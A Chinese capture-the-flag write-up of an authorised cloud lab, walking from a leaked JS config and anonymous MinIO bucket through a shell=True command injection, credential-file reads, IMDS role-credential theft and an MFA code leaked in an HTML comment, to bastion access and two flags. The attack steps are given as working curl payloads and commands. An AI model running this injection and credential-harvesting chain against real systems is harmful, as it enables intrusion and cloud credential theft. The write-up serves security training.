# 穿云靶机复盘：从制品桶到云内网纵深（一只枷锁）

> 本文记录的是授权靶场复盘。公网靶机、命令注入与凭据利用均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | 穿云协同办公门户（云岭智联 · 穿云平台 v2.4.0） |
| 作者 | 一只枷锁 |
| 目标地址 | `47.92.171.62`（阿里云公网） |
| 攻击机 | Kali，全程 `curl` 直连，无跳板机 |
| 开放端口 | 22/tcp（OpenSSH）、80/tcp（nginx） |
| 目标 | 两个 flag |
| 最终路径 | 门户 JS → 匿名 MinIO → NYX `diag/netcheck` 注入 → 落点令牌 + IMDS → 知识库口令信封 → MFA 注释泄露 → OMC / 堡垒机 |

![群聊邀请](/content/chuanyun/image-01.webp)

## 1. 攻击链概览

主题不是单点洞，而是**多区域云环境的横向链**：

```text
DMZ 门户
  → 前端 JS 泄露 /portal-api、/yl-artifacts
  → MinIO 制品桶匿名只读 → nyx-src-0.9.2.tar.gz
  → /nyx/api/v1/diag/netcheck 命令注入 → 容器 nyx
  → deploy.env.bak 落点令牌 + note.txt 员工账密
  → IMDS 取 nyx-deploy-role → 读 yj-ops-backup
  → /broker/activate 进业务内网
  → DokuWiki 附件拿到 OMC 超管信封
  → MFA 验证码在 HTML 注释里 → 运维管理员
  → OMC 退役任务 flag1 / 堡垒机 deploy-persist flag2
```

**Flag：**

- `FLAG{N1ght0wl_R3t1r3d_ChuanYun_2026}` —— OMC「夜鸮退役清理」环境封存凭证  
- `FLAG{P3rs1st_H00k_ChuanYun_2026}` —— 堡垒机对 `ops-core-01` 下发 `deploy-persist` 的守护部署回执  

## 2. 信息收集

```bash
nmap -sT -sV -sC -O -p- 47.92.171.62
# 22 OpenSSH 9.6p1 / 80 nginx · 穿云协同训练门户
```

![nmap](/content/chuanyun/image-02.webp)

门户首页列出快捷入口：`/wiki/`、`/gitlab/`、`/grafana/`、`/cloud-api/`。未激活落点前，前三个一律 302 到 `/broker/required`。

![门户](/content/chuanyun/image-03.webp)

`/static/js/app.7d42e9.js` 头部注释与 `__RUNTIME__` 直接给出制品桶：

```js
/* pipeline: fe-release/#1142 -> artifacts -> yl-artifacts/manifest.json */
var __RUNTIME__={apiBase:"/portal-api/v1", objStoreBase:"/yl-artifacts", ...};
```

![JS 泄露](/content/chuanyun/image-04.webp)

`GET /yl-artifacts/` 是 **MinIO 匿名 ListBucket**，对象可下：

```text
build-20260814-A-1142.log
nyx-src-0.9.2.tar.gz
portal-static-2.4.0.tar.gz
...
```

构建日志还点出实例角色 `nyx-deploy-role`，以及「QA 可见 → 匿名读策略」。

![制品桶](/content/chuanyun/image-05.webp)

![列桶](/content/chuanyun/image-06.webp)

## 3. NYX 沙箱：`diag/netcheck` 命令注入

下源码对一下：

```bash
curl -sO http://47.92.171.62/yl-artifacts/nyx-src-0.9.2.tar.gz
tar xzf nyx-src-0.9.2.tar.gz
grep -n 'shell=True\|ping -c' nyx-src-0.9.2/app.py
```

遗留诊断接口把 `target` 拼进 shell：

```python
@app.post("/api/v1/diag/netcheck")
def diag_netcheck():
    target = (request.get_json(silent=True) or {}).get("target", "").strip()
    cmd = "ping -c 2 -W 2 " + target
    subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
```

经网关 `/nyx/` 对外暴露。`target` 上限 128 字节、输出截断 8192，交互用短命令或 `nyxsh.py`：

```bash
curl -s -X POST http://47.92.171.62/nyx/api/v1/diag/netcheck \
  -H 'Content-Type: application/json' -d '{"target":"127.0.0.1; id"}'
# uid=10001(nyx) gid=10001(nyx)
```

容器内关键文件：

```bash
cat /opt/nyx/creds/note.txt
# chen.mo / Cm@2026Nyx#Dev（业务区普通员工）

cat /opt/nyx/deploy.env.bak
# NYX_LANDING_TOKEN=YJ-BROKER-7f3a9c2e1d8b04f6
```

![容器情报](/content/chuanyun/image-07.webp)

`RECORDS.md` 给出云内拓扑：`metadata.yunling.internal`、`cloudapi`、`minio`、`identity`、`wiki`、`broker`。

## 4. IMDS 角色凭据 → 运维备份桶

容器能打到元数据（IMDS v1 风格）：

```bash
curl -s http://metadata.yunling.internal/latest/meta-data/iam/security-credentials/nyx-deploy-role
# AccessKeyId / SecretAccessKey / Token（CY-HMAC，宣称 6h）

curl -s http://metadata.yunling.internal/latest/user-data
# OPS_BACKUP_BUCKET=yj-ops-backup
```

用角色头打门户代理的 CY-OSS：

```bash
H=(-H "X-CY-Access-Key: ..." -H "X-CY-Secret-Key: ..." -H "X-CY-Security-Token: ...")
curl -s "${H[@]}" http://47.92.171.62/cloud-api/v2/policy
# 允许 yl-artifacts/*、yj-ops-backup/*；Deny yl-backup-private/*
```

`yj-ops-backup` 里是 Ansible 清单、CMDB 导出、变更工单 OPS-2026-121（持久化作业**只能经堡垒机通道**）等运维情报——桶内刻意不含明文凭据。

![备份桶](/content/chuanyun/image-08.webp)

![工单](/content/chuanyun/image-09.webp)

## 5. 落点会话 → 知识库口令信封

```bash
curl -c cj.txt -X POST http://47.92.171.62/broker/activate \
  --data 'token=YJ-BROKER-7f3a9c2e1d8b04f6'
# Set-Cookie: yj_lp=...; Max-Age=7200
```

有落点 Cookie 后仍要员工会话才能进 Wiki。用 `chen.mo` 登录 YLID，打开 `it:legacy-archive`，附件区直取：

```bash
curl -b cj.txt 'http://47.92.171.62/wiki/lib/exe/fetch.php?media=it:handover-notes.txt'
```

```text
OMC 运维管理区 超级管理员：
  账号：lin.xiaofeng
  口令：Yl@Night0wl#2026
备注：按《账号与口令规范 v2》—— Yl@ + 系统代号 + #年份
```

口令构成写进规范，项目代号一旦可推断就能拼出来——这条链的关键弱点之一。

![交接信封](/content/chuanyun/image-10.webp)

## 6. MFA 验证码进了 HTML 注释

用超管账密登录，服务端返回二次验证页，页面底部调试注释直接带码：

```html
<!-- [sms-gw debug] channel=yunling-sms to=lin****ong
     template=YLID_MFA code=123443 retry=allowed -->
```

```bash
curl -c cj.txt -b cj.txt -X POST http://47.92.171.62/identity/login/mfa \
  --data-urlencode 'challenge=<CH>' --data-urlencode 'code=<CODE>'
```

角色变成**运维管理员**，解锁 OMC、AutoOps、CMDB、Bastion：

![个人中心](/content/chuanyun/image-14.webp)

![运维入口](/content/chuanyun/image-11.webp)

![MFA / 会话](/content/chuanyun/image-12.webp)

## 7. 两个 flag

OMC 直接跑「夜鸮退役清理」：

```bash
curl -b cj.txt -X POST http://47.92.171.62/target/tasks/retire-nyx/run
# 环境封存凭证：FLAG{N1ght0wl_R3t1r3d_ChuanYun_2026}
```

持久化守护只能走堡垒机白名单命令（对照工单 OPS-2026-121）：

```bash
curl -b cj.txt -X POST http://47.92.171.62/bastion/jump \
  --data-urlencode 'asset=ops-core-01' \
  --data-urlencode 'cmd=deploy-persist'
# 守护部署回执：FLAG{P3rs1st_H00k_ChuanYun_2026}
```

![flag](/content/chuanyun/image-15.webp)

![堡垒机](/content/chuanyun/image-13.webp)

## 8. 小结

| 步 | 区域 | 手法 | 产出 |
|----|------|------|------|
| 1 | DMZ | 门户 JS 泄露 | `/yl-artifacts` |
| 2 | 云测试 | MinIO 匿名只读 | NYX 源码 + 构建日志 |
| 3 | 云测试 | `diag/netcheck` 注入 | 容器 shell |
| 4 | 云测试 | 便签 / `.env.bak` | 员工账密 + 落点令牌 |
| 5 | 云测试 | IMDS 角色凭据 | 读运维备份桶 |
| 6 | 业务内网 | broker + Wiki 附件 | OMC 超管信封 |
| 7 | 业务内网 | MFA 注释泄露 | 运维管理员 |
| 8 | 运维管理区 | OMC 任务 / 堡垒机 | **两个 flag** |

根因很集中：制品桶匿名读、遗留诊断 `shell=True`、可预测口令规范、敏感值写进响应体、部署角色跨桶过授权。完整手工命令见仓库 [`复现-手工.md`](https://gitee.com/zx67834/my-target-drone-review/blob/master/47.92.171.62/复现-手工.md)。
